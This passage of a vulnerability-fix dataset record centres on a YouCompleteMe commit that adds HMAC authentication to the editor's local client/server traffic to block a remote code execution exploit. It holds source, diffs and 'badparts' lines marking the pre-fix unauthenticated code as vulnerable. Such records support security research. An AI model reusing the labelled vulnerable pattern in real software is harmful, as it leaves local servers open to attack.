vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http://localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"}, "/python/ycm/youcompleteme.py": {"changes": [{"diff": "\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n", "add": 5, "remove": 3, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    self._temp_options_filename = None", "      self._temp_options_filename = options_file.name", "      json.dump( dict( self._user_options ), options_file )"], "goodparts": ["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )", "      options_dict = dict( self._user_options )", "      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )", "      json.dump( options_dict, options_file )"]}, {"diff": "\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "add": 0, "remove": 1, "filename": "/python/ycm/youcompleteme.py", "badparts": ["    utils.RemoveIfExists( self._temp_options_filename )"], "goodparts": []}], "source": "\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http://localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https://github.com/Valloric/YouCompleteMe/issues/641\n#  https://github.com/kennethreitz/requests/issues/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http://localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}}, "msg": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}}, "https://github.com/bujigr/YouCompleteMe": {"e965e0284789e610c0a50d20a92a82ec5c135064": {"url": "https://api.github.com/repos/bujigr/YouCompleteMe/commits/e965e0284789e610c0a50d20a92a82ec5c135064", "html_url": "https://github.com/bujigr/YouCompleteMe/commit/e965e0284789e610c0a50d20a92a82ec5c135064", "message": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.", "sha": "e965e0284789e610c0a50d20a92a82ec5c135064", "keyword": "remote code execution prevent", "diff": "diff --git a/python/ycm/client/base_request.py b/python/ycm/client/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a/python/ycm/client/base_request.py\n+++ b/python/ycm/client/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def 